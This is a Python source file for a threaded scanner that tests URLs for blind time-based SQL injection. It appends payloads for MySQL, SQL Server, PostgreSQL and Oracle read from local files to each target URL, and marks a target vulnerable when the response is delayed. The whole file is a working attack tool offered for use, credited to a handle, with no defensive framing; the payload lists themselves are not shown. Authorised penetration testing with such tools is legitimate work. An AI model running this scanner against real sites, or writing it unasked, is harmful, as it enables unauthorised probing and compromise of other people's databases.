#CODED BY @wh0l5th3r00t

import argparse
import requests
import time
import os
from colorama import Fore, Style, init
from threading import Thread, BoundedSemaphore

init(autoreset=True)

def load_payloads(server, level):
    payloads = []
    if server:
        server_files = {
            "MySQL": "MySQL Blind (Time Based).txt",
            "Microsoft SQL Server": "Microsoft SQL Server Blind (Time Based).txt",
            "Postgresql": "Postgresql Blind (Time Based).txt",
            "Oracle": "Oracle Blind (Time Based).txt"
        }
        if server in server_files:
            with open(os.path.join('payloads', server_files[server]), 'r') as file:
                payloads = file.readlines()
    else:
        with open(os.path.join('payloads', f'payloadsL{level}.txt'), 'r') as file:
            payloads = file.readlines()
    return [payload.strip() for payload in payloads]

def test_vulnerability(url, payload):
    start_time = time.time()
    try:
        response = requests.get(url + payload, timeout=10)
        elapsed_time = time.time() - start_time
        if elapsed_time >= 5:
            return True, elapsed_time
        else:
            return False, elapsed_time
    except requests.RequestException:
        elapsed_time = time.time() - start_time
        if elapsed_time >= 5:
            return True, elapsed_time
        return False, elapsed_time

def identify_server(vulnerable_payload):
    server_files = [
        ("Generic", "Generic Time Based SQL.txt"),
        ("MySQL", "MySQL Blind (Time Based).txt"),
        ("Microsoft SQL Server", "Microsoft SQL Server Blind (Time Based).txt"),
        ("Postgresql", "Postgresql Blind (Time Based).txt"),
        ("Oracle", "Oracle Blind (Time Based).txt")
    ]
    for server, filename in server_files:
        with open(os.path.join('payloads', filename), 'r') as file:
            payloads = file.readlines()
            if vulnerable_payload.strip() in [p.strip() for p in payloads]:
                return server
    return "Unknown"

def worker(url, payloads, server, semaphore):
    with semaphore:
        for payload in payloads:
            vulnerable, response_time = test_vulnerability(url, payload)
            if vulnerable:
                if server:
                    print(f"{Fore.YELLOW}[{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}VULNERABLE{Style.RESET_ALL}{Fore.YELLOW}]{Style.RESET_ALL} {Fore.YELLOW}-{Style.RESET_ALL} {Fore.CYAN}{url + payload}{Style.RESET_ALL} {Fore.YELLOW}|{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}POSSIBLE SERVER: {server}{Style.RESET_ALL} {Fore.YELLOW}|{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}RESPONSE TIME: {response_time:.2f}s{Style.RESET_ALL}")
                else:
                    detected_server = identify_server(payload)
                    print(f"{Fore.YELLOW}[{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}VULNERABLE{Style.RESET_ALL}{Fore.YELLOW}]{Style.RESET_ALL} {Fore.YELLOW}-{Style.RESET_ALL} {Fore.CYAN}{url + payload}{Style.RESET_ALL} {Fore.YELLOW}|{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}POSSIBLE SERVER: {detected_server}{Style.RESET_ALL} {Fore.YELLOW}|{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}RESPONSE TIME: {response_time:.2f}s{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.YELLOW}[{Style.RESET_ALL}{Fore.RED}NOT VULNERABLE{Style.RESET_ALL}{Fore.YELLOW}]{Style.RESET_ALL} {Fore.YELLOW}-{Style.RESET_ALL} {url + payload} {Fore.YELLOW}|{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}RESPONSE TIME: {response_time:.2f}s{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Blind SQLi | CODER @wh0l5th3r00t | V2')
    parser.add_argument('-u', '--url', type=str, help='Target URL')
    parser.add_argument('-l', '--list', type=str, help='List of URLs')
    parser.add_argument('-p', '--payload', type=str, help='Payload list')
    parser.add_argument('-s', '--server', type=str, choices=["MySQL", "Microsoft SQL Server", "Postgresql", "Oracle"], help='Database server')
    parser.add_argument('-L', '--level', type=int, choices=[1, 2], default=1, help='Payload level')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')

    args = parser.parse_args()
    
    banner = f"""{Fore.BLUE}
      ___ _ _         _   ___  ___  _    _ 
     | _ ) (_)_ _  __| | / __|/ _ \| |  (_)
     | _ \ | | ' \/ _` | \__ \ (_) | |__| |
     |___/_|_|_||_\__,_| |___/\__\_\____|_|
        Blind SQLi | CODER @wh0l5th3r00t | V2
    {Style.RESET_ALL}"""
    print(banner)

    urls = []
    if args.url:
        urls.append(args.url)
    elif args.list:
        with open(args.list, 'r') as file:
            urls = file.readlines()

    payloads = []
    if args.payload:
        with open(args.payload, 'r') as file:
            payloads = file.readlines()
    else:
        payloads = load_payloads(args.server, args.level)

    semaphore = BoundedSemaphore(args.threads)
    threads = []

    for url in urls:
        url = url.strip()
        thread = Thread(target=worker, args=(url, payloads, args.server, semaphore))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()